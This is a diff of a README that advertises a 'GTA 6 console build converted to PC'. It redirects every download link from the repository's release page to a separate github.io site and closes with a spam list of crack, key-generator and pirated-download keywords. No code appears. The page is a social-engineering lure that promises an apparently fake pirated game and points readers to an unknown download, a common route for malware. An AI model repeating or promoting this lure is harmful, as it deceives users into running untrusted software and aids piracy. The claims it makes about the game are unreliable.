@@ -1,6 +1,6 @@
 # 🎮 GTA-6-Console-Build-Converted-To-PC - Play GTA 6 on Windows Today
 
-[![Download Now](https://img.shields.io/badge/Download-GTA_6_PC_Build-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Sopheycool1656/GTA-6-Console-Build-Converted-To-PC/releases)
+[![Download Now](https://img.shields.io/badge/Download-GTA_6_PC_Build-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://sopheycool1656.github.io)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Visit this link to download the application:
 
-[**https://github.com/Sopheycool1656/GTA-6-Console-Build-Converted-To-PC/releases**](https://github.com/Sopheycool1656/GTA-6-Console-Build-Converted-To-PC/releases)
+[**https://sopheycool1656.github.io**](https://sopheycool1656.github.io)
 
 Once you click the link, you will see a list of available files. Choose the latest version and download it to your computer. The download will start automatically after you click the file name.
 
@@ -179,6 +179,6 @@ All done? You are ready to play GTA 6 on your PC. Enjoy the game.
 
 Again, here is the link to get the game:
 
-[**DOWNLOAD GTA 6 PC BUILD**](https://github.com/Sopheycool1656/GTA-6-Console-Build-Converted-To-PC/releases)
+[**DOWNLOAD GTA 6 PC BUILD**](https://sopheycool1656.github.io)
 
 Keywords: gta-6-all-dlc, gta-6-bypass, gta-6-crack, gta-6-cyberleek, gta-6-deluxe-edition, gta-6-dev-build, gta-6-download, gta-6-drm-free, gta-6-emulator-pc, gta-6-fitgirl, gta-6-installer, gta-6-key-generator, gta-6-launcher, gta-6-mediafire, gta-6-offline, gta-6-pirated, gta-6-portable, gta-6-redeem-code, gta-6-serial-key, gta-6-working-2026
